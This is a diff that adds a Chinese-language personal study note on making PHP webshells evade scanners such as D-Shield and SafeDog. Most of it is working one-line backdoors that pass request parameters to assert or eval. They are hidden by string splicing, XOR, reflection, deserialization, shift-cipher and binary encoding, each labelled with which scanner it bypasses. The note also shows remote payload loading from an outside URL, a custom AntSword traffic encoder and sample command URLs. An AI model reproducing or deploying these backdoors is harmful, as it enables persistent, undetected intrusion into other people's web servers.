@@ -1,0 +1,626 @@
+
+d盾查杀内置函数很可能存在字段长度缺陷，内置函数名大于7位才能绕过，外部函数大于31位也才能绕过。
+反正多尝试超长变量名、函数名试一下。
+
+文件上传：参数污染绕过D盾。
+
+三元运算符或源码加密免杀，如：
+#使用三元运算符绕过安全狗的一句话检测
+$a =(1>1) ? '0':'p';
+$b = (1>1) ? '0':'_POST';
+
+
+修改特征码去掉图标等多余信息、重命名->vs重新编译->免杀。
+
+准备弹药.
+1.免杀shell：如php webshell免杀.
+一句话木马免杀且包括流量：
+组成部分：
+a.数据传输：
+a1：http请求传输
+a2：远程加载
+file_get_contents(需开启allow_url_fopen)
+fopen(需开启allow_url_fopen)
+
+php本地加载：
+include("q.php")
+require
+a3：从数据库读取.
+a4：从图片头部中获取：exif_read_data
+
+b.执行数据部分：
+b1：命令执行函数：eval、assert(php7.1以上无法使用)、system、exec、shell_exec
+b2：LFI(文件包含).
+b3：动态函数执行(如拼接、混淆等).
+
+c.免杀对象：
+护卫神、网站安全狗、D盾、河马.
+
+
+免杀手法：
+字符拆分重组、拼接、编码、替换：
+常用函数：
+ucwords()	//将字符串中的每个单词的首字符转为大写
+ucfirst() 	//将字符串的首字符转为大写
+trim() 		//去除字符串两端空白字符和其他预定义字符
+substr_replace() 	//替换字符串
+substr() 	//截取字符串
+strstr() 	//转换字符串中特定的字符
+strtoupper() //将字符串转为大写
+strtolower() 	//将字符串转为小写
+strtok() 	//将字符串分割为更小的字符串
+str_rot13() //对字符串执行ROT13编码转换.
+
+
+能绕过安全狗：不能绕过D盾.
+--------------1s-------------------
+<?php
+	$w=substr("wzqda",4).'s'.'s'.'e'.'r'.'t';
+	$w($_REQUEST[cmdq]);
+?>
+----------------1e--------------
+
+
+D盾检测等级只为1：能过安全狗.
+--------------2s-------------------
+<?php
+	$w=substr_replace("asswpq","ert",3);
+	$w($_REQUEST[cmdq]);
+?>
+----------------2e--------------
+
+
+异或：两次异或得其本身，如：$z="!"^"t"^"t";为"!"
+$z="p"^"z"^"z";为"p"
+$z="!"^"R";为"s"
+
+
+--------------3s-------------------
+<?php
+	$z="!"^"R";
+	$w='a'.$z.$z.'e'.'r'.'t';
+	$w($_REQUEST[cmdq]);
+?>
+--------------3e-------------------
+
+或者直接写个异或脚本，生成对应木马->上传->访问、循环.
+
+
+反转：
+<?php
+$a="tressa";
+$b=strrev($a);
+@$b($_REQUEST[cmdz]);
+?>
+
+
+
+函数变形：
+常见回调函数：参考而已.
+call_user_func_array()
+call_user_func()
+array_filter()
+array_walk()
+array_map()
+registregister_shutdown_function()
+register_tick_function()
+filter_var()
+filter_var_array()
+uasort()
+uksort()
+array_reduce()
+array_walk()
+array_walk_recursive()
+
+自定义普通函数：D盾等级2. 能过安全狗.
+--------------1s---------------
+<?php
+function test($a,$b){
+array_map($a,$b);
+}
+$a=substr_replace("assexx","rt",4);
+@test($a,array($_POST['cmdz']));
+?>
+------------------1e---------------
+
+
+
+反序列化：能过狗，过D盾.
+--------------1s----------------
+<?php
+class test{
+	var $runner;
+	var $payload;
+	var $ccz;
+	function __construct($a,$q){
+		$this->a=$a;
+		$this->q=array($q);
+	}
+	function __sleep(){
+		array_map($this->a,$this->q);
+	}
+}
+$e=substr_replace("asswzw","ert",3);
+$pz=new test($e,$_REQUEST[cmdz]);
+serialize($pz);
+?>
+---------------1e-----------------
+
+
+
+魔法函数：过狗过D盾.
+------------1s---------------------
+<?php
+class zeq1{
+	public $q='';
+	function postz(){
+		return $_REQUEST[cmdz];
+	}
+}
+
+class zeq2 extends zeq1{
+	public $codez=null;
+	function __construct(){
+		$codeq=parent::postz();
+		@assert($codeq);
+	}
+}
+$billz=new zeq2;
+?>
+------------------1e--------------
+
+析构函数：过狗过D盾.
+----------------1s---------------
+<?php
+class purez{
+	public $q="";
+	function __destruct(){
+		assert("$this->a");
+	}
+}
+$bz=new purez;
+$bz->a=$_REQUEST[cmdz];
+function mysubstr($a,$b){
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+}
+?>
+------------1e-----------------
+
+
+浏览器直接访问并执行webshell可以，蚁剑却返回空：可能是针对流量特征进行了防御.
+绕过：
+1.尝试base64或其他的蚁剑编码、解码器.
+
+
+
+
+
+免杀手法：
+反射：
+反射机制即利用类名或一个类的对象来获取关于这个类的一系列信息(包括类方法或类变量)，再利用得到的类信息来实例化一些类的对象。
+php反射：
+-------------1s-----------------
+<?php
+	class test extends ReflectionFunction{}
+	$a=substr_replace("assxxx","ert",3);
+	$f=new test($a);
+	$f->invoke($_REQUEST[cmdz]);
+?>
+----------------1e-----------------
+分析：$a其实就是一个函数对象(一个函数名)，invoke()中传递其参数即可. 因为此例中$a值为assert字符串，故调用的是assert函数.
+
+
+能过狗过D盾.
+-------------2s-----------------
+<?php
+	class test extends ReflectionFunction{}
+	$a=@$_GET['tokenz'];
+	$f=new test($a);
+	$f->invoke($_REQUEST[cmdz]);
+?>
+----------------2e-----------------
+则可通过GET传递assert等函数名.
+http://192.168.10.101:86/p1.php?tokenz=assert&cmdz=phpinfo()
+webshell连接时：
+http://192.168.10.101:86/p1.php?tokenz=assert
+密码：cmdz
+
+
+-------------3s-----------------
+<?php
+	$a=substr_replace("assxxx","ert",3);
+	$functionz=new ReflectionFunction($a);
+	$functionz->invoke($_REQUEST[cmdz]);
+?>
+----------------3e-----------------
+
+过狗过D盾.
+-------------4s-----------------
+<?php
+	class test extends ReflectionFunction{}
+	$a=substr_replace("assxxx","ert",3);
+	$f=new test($a);
+	$f->invokeArgs(array($_REQUEST[cmdz],)); 	//没有,也行.
+?>
+----------------4e-----------------
+http://192.168.10.101:86/p1.php?cmdz8=system('whoami')
+
+
+哥斯拉和冰蝎必须有针对性的马才行.
+
+
+
+正则匹配：
+常用函数：
+preg_replace：执行一个正则表达式的搜索和替换.
+preg_filter：执行一个正则表达式的搜索和替换.
+preg_replace_callback：执行一个正则表达式的搜索冰使用一个回调进行替换.
+注：加上/e后，正则会执行$_REQUEST[cmdz]中的内容，如：
+-------------1s-----------
+<?php
+	@preg_replace(array("/.*/e"),$_REQUEST[cmdz],"");
+?>
+--------------1e----------------
+
+-------------2s-----------
+<?php
+	preg_replace_callback($qz=array(''=>('/.+/i')),create_function('$a','return assert($a[0]);'),$_REQUEST['cmdz']);
+?>
+--------------2e----------------
+
+
+二维数组：
+-------------3s-----------
+<?php
+$z=substr_replace("assexz","rt",4);
+$q=$_REQUEST[cmdzw];
+$w=array(
+	$arrayNamq1e=(
+		$arrayNamq2e=(
+			$arrayNamq3e=array('p'=>$z($q))
+			)
+		)
+	);
+?>
+-------------3s-----------
+
+
+
+使用全局变量来传递：过D盾级别2，不太好.
+-------------4s-----------
+<?php
+	$z=substr_replace("assexz","rt",4);
+	$COOKIZE=$_COOKIE;	foreach($COOKIZE as $keqy=>$valuwe){
+		if($keqy==$z){
+			var_dump($keqy);
+			$keqy($_REQUEST[cmdz]);
+		}
+	}
+?>
+-------------4s-----------
+使用时，添加Cookie项，只需左边的key为assert等执行函数名即可。如：
+Cookie: assert=wdz
+
+蚁剑也能设置，如：添加Header：
+Name：Cookie
+Value：assert=wdz
+
+
+
+
+分离加载：将木马代码写在q.txt中.
+<?php
+assert($file_get_contents('http://www.wkdz.com/q.txt'));
+?>
+
+
+伪协议利用.
+--------------1s----------------------
+<?php
+$a=substr_replace("assxxx","ert",3);
+$a(file_get_contents('php://input'));
+?>
+-----------------1e-------------------
+GET或POST都行，请求正文写内容即可，如phpinfo()
+
+
+
+
+php7+eval：添加注释符.
+eval不能使用拼接，必须完整写eval
+析构函数：过狗过D盾.
+----------------1s---------------
+<?php
+class purez{
+	public $q="";
+	function __destruct(){
+		eval("/*sakdkertkmsmsbxzzasdmwdz*/"."$this->a"); 	//注释内的东西不会执行.
+	}
+}
+$bz=new purez;
+$bz->a=$_REQUEST[cmdz];
+function mysubstr($a,$b){
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+	echo "?asddfg!sd|fe|hrez";
+}
+?>
+------------1e-----------------
+
+
+若木马代码为：eval($_REQUEST[cmdq]);
+则传参使用方式为：p1.php?cmdq=system("whoami");
+需手动加上;
+
+若木马代码为：eval("$_REQUEST[cmdq];");
+则传参使用方式为：p1.php?cmdq=phpinfo()
+不需加上;
+
+
+
+
+$arr = array('Hello','World!','Beautiful','Day!');
+echo implode("-",$arr); //以'-'来拼接数组的元素为字符串.
+
+
+移位实现免杀：
+木马代码：过狗过D盾.  >=php7
+-----------1s---------
+<?php
+class FKPC{
+      function __construct(){
+      $this->TQYV = "bs^i%!\MLPQXwbolZ&8";
+      $this->WZDM = @HHGJ($this->TQYV);
+	  //var_dump($this->WZDM);
+      @eval("/*#jkskjwjqo*/".$this->WZDM."/*sj#ahajsj*/");
+      }}
+new FKPC();
+function HHGJ($UyGv) {
+$svfe = [];
+$mxAS = '';
+$f = $UyGv;
+for ($i=0;$i<strlen($f);$i++)
+{
+  $svfe[] = chr((ord($f[$i])+3));
+}
+$mxAS = implode($svfe);
+return $mxAS ;
+}
+?>
+-------------1e----------
+
+解密函数：
+------------1s--------
+<?php
+$TQYV = "bs^i%!\MLPQXwbolZ&8";
+
+$q='eval($_POST[zero]);';
+
+$svfe = [];
+for ($i=0;$i<strlen($q);$i++)
+{
+  $w1=ord($q[$i])-3;
+  $w2=chr($w1);
+  $svfe[]=$w2;
+  
+}
+$mxAS = implode($svfe);
+var_dump($mxAS);
+?>
+--------------1e----------
+
+
+
+二进制转换实现免杀：过狗过D盾. 支持php5，也支持php7.
+-------------1s---------
+<?php
+class KUYE{
+        public $DAXW = null;
+        public $LRXV = null;
+        function __construct(){
+        $this->DAXW = '1100101 1110110 1100001 1101100 101000 100100 1011111 1010000 1001111 1010011 1010100 1011011 1111010 1100101 1110010 1101111 1011101 101001 111011';
+        $this->LRXV = @BinToStr($this->DAXW);
+        @eval("/*GnSpe=u*/".$this->LRXV."/*GnSpe=u*/");
+        }}
+new KUYE();
+function BinToStr($str){
+    $arr = explode(' ', $str);
+    foreach($arr as &$v){
+        $v = pack("H".strlen(base_convert($v, 2, 16)), base_convert($v, 2, 16));
+    }
+    return join('', $arr);
+}
+?>
+--------------1e------------
+
+
+
+
+
+
+
+rot13加密.
+base32编码.
+
+eval()函数将字符串按照php代码来执行.
+该字符串必须以分号结尾.
+
+
+多收集免杀一句话，从代码层学习免杀原理.
+webshell免杀工具：
+https://github.com/lovelyjuice/php_venom
+https://github.com/pureqh/webshell
+
+
+不能太依赖工具.
+================128e=========
+done.
+
+
+
+第一百二十九节：
+==============129s===========
+
+在>=php7上使用assert函数：解引用使用任意表达式.
+-------------1s----------------
+<?php
+class wetrez{
+	protected $a="asdkfdgjwrtz";
+	public function __construct($a){
+		$this->a=$a;
+		@('assert')($this->a);
+	}
+}
+new wetrez(@$_REQUEST[xz]);
+?>
+--------------1e----------------------
+
+
+大马免杀：
+1.分离免杀、远程加载.
+2.内容编码、加密免杀.
+
+
+
+
+
+冰蝎自带木马不能过安全狗、D盾.
+免杀安全狗：修改为如下即可：
+$t=substr_replace("bas23456sadwdwawdw565","e64_decode",3);
+
+
+
+自己写免杀时最后阶段最好将大部分变量修改为随机变量.
+
+
+
+免杀方式：
+通过删减法定位查杀的代码。
+变量通过函数返回，换个马甲。
+添加注释。
+分割、替换。
+使用中间变量来转换。
+
+
+随机密码
+eKBReqfF4i9&VThB
+-->cmd5加密生成32位密文：
+fdc274903902842d1825899bf382674b
+-->取前16位：
+fdc274903902842d
+作为连接密码写在代码中。
+冰蝎连接密码则为：eKBReqfF4i9&VThB
+
+冰蝎的key的作用：
+通过file_get_contents("php://input")获得的POST数据来与key做异或等处理，进而获得func和params.
+
+冰蝎连接时使用的密码作用：
+应该是需要与POST的数据进行各种处理，若密码不正确，则在服务器代码中与key异或等处理时结果不正确，故执行命令会失败。
+
+
+
+Troy免杀生成：
+https://github.com/pureqh/Troy
+需要自己简单处理一下：
+将base64_decode处理为：
+-----------------1s---------------------
+$t=substr_replace("bas23456sadwdwawdw565","e64_decode",3);
+$OBHN=$t;
+----------------1e-----------------
+
+
+
+猜测实际上冰蝎if那一段只是迷惑对手，根本不会执行。核心是执行else那一段代码.
+
+
+
+蚁剑：注意是对流量进行编码转换、混淆，绕过waf的流量监控或查杀.
+到达waf前经过编码器对代码或流量进行编码(如base64)，服务器执行的结果经过编码-->waf-->客户端解码.
+以上过程能直接使用PHP代码来实现.
+
+蚁剑设置的编码器和解码器互相独立，可以不同。
+故自己使用时最好使用小众的算法或自己自定义加解密算法(自己创造一个加解密算法)。
+
+
+
+蚁剑的编码器原理：
+通过传递一个随机参数(如awz=@eval(@base64_decode($_POST['cc38c8ced50f56']));)作为入口，再将编码后的代码以另一个随机变量POST传递.
+php代码层将得到的结果进行编码-->流量传递-->蚁剑客户端对其进行解码.
+
+
+
+使用加解密函数进行免杀：
+如rot13、base32、自定义加密函数-->将木马源码加密后的密文作为字符串->再写个解密函数，执行即可。
+
+
+可以写个脚本、随机变量等、生成免杀木马。
+
+推荐哥斯拉免杀.
+
+凯撒加密、rot13加密，python生成模板、生成免杀木马。
+
+大马：编码加密进行免杀.
+
+waf查杀技术：
+1.静态查杀：特征码、规则匹配.
+2.动态查杀：根据程序允许产生的行为来查杀.
+3.云查杀：
+上报样本到云端进行检测(云端一般会运行、分析)
+云沙箱运行样本
+深度学习检测
+威胁情报检测
+
+
+去除工具特征：必须具备逆向和编程能力.
+漏洞库：POC/EXP
+常见组件漏洞利用工具收集。
+
+
+冰蝎使用条件：
+其使用openssl_decrypt函数，需php>=5.3
+
+
+推荐哥斯拉。
+
+蚁剑编码器、解码器不推荐使用其默认的，最好自己编写：
+
+
+流量代理：mitmproxy
+即自己编程实现编码器、解码器的功能。
+eg1：
+---------------1s----------
+'use strict';
+module.exports = (pwd, data, ext={}) => {
+  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
+  // 原有的 payload 在 data['_']中
+  // 取出来之后，转为 base64 编码并放入 randomID key 下
+  
+  data[randomID] = Buffer.from(data['_']).toString('base64');
+
+  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
+  data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;
+  delete data['_'];
+  return data;
+}
+-------------1e---------------
+
+自定义蚁剑编码器、解码器：
+https://github.com/AntSwordProject/AwesomeEncoder
+
+菜刀：默认使用assert函数.
+二开麻烦，流量需中转加密(proxifier).
+
+几乎能绕过当前市面上所有的webshell查杀方式：
+关键信息在连接时才传递，即使动态查杀也没什么办法。
+如：
+Referer: http://www.target.com/ass.php
+截取ass字符拼接，执行。
+
